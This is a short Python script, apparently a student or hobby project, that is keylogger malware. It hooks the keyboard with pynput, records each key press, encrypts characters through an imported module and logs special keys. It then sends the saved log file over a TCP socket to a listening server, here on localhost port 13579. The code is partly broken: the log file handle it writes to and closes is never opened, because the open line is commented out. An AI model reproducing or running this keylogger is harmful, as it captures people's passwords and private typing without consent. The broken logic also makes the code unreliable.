#print('This is the main file')

#Start from scratch

from pynput import keyboard
from pynput.keyboard import Listener
from Encription_File import *
import socket

Stroke = None
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('localhost', 13579))

#storage = open('KeyBoard_Save.txt', 'a')

def record_click(key):
    global Stroke  # Declare that we are using the global variable
    try:
        Stroke = key.char
        encription(Stroke)
    except AttributeError:
        storage.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

with keyboard.Listener(on_press=record_click, on_release=on_release) as listener:
    listener.join()

storage.close()

with open("Keyboard_Save.txt", 'rb') as file:
        while True:
            # Read the file in chunks
            chunk = file.read(1024)
            if not chunk:
                break  # Exit loop if end of file
            # Send the chunk to the server
            client_socket.sendall(chunk)

client_socket.close()
print(f"File '{"Keyboard_Save.txt"}' sent successfully.")